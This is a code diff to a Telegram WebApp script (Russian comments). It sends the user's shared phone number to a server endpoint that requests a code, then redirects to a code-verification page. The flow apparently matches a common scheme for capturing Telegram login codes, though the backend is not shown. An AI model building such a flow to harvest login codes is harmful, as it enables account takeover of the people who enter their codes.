@@ -1,17 +1,25 @@
 // Функция запроса номера телефона через Telegram WebApp
 function requestPhoneNumber() {
-    // Запрашиваем номер через нативный диалог Telegram
-    window.Telegram.WebApp.requestContact((contact) => {
-        if (contact && contact.phone_number) {
-            // Сохраняем номер
-            localStorage.setItem('phoneNumber', contact.phone_number);
-            
-            // Показываем страницу загрузки
-            showLoadingPage();
-        } else {
-            alert('❌ Не удалось получить номер телефона');
-        }
-    });
+    // Проверяем, запущено ли приложение в Telegram
+    if (window.Telegram && window.Telegram.WebApp) {
+        // Запрашиваем номер через нативный диалог Telegram
+        window.Telegram.WebApp.requestContact((contact) => {
+            if (contact && contact.phone_number) {
+                // Сохраняем номер
+                localStorage.setItem('phoneNumber', contact.phone_number);
+                
+                // Показываем страницу загрузки
+                showLoadingPage();
+            } else {
+                alert('❌ Не удалось получить номер телефона');
+            }
+        });
+    } else {
+        // Для тестирования вне Telegram - используем тестовый номер
+        const testPhone = '+1234567890';
+        localStorage.setItem('phoneNumber', testPhone);
+        showLoadingPage();
+    }
 }
 
 // Функция показа страницы загрузки
@@ -59,10 +67,35 @@ function showLoadingPage() {
     
     document.body.insertAdjacentHTML('beforeend', loadingHTML);
     
-    // Через 3 секунды переходим на страницу ввода кода
-    setTimeout(() => {
-        window.location.href = 'code-verification.html';
-    }, 3000);
+    // Отправляем запрос на сервер для получения кода
+    const phoneNumber = localStorage.getItem('phoneNumber');
+    
+    fetch('/api/request_code', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            phone: phoneNumber
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            // Через 3 секунды переходим на страницу ввода кода
+            setTimeout(() => {
+                window.location.href = '/code-verification';
+            }, 3000);
+        } else {
+            alert('❌ Ошибка: ' + (data.error || 'Не удалось отправить код'));
+            document.body.removeChild(document.body.lastElementChild);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('❌ Ошибка соединения с сервером');
+        document.body.removeChild(document.body.lastElementChild);
+    });
 }
 
 // Функции для модального окна
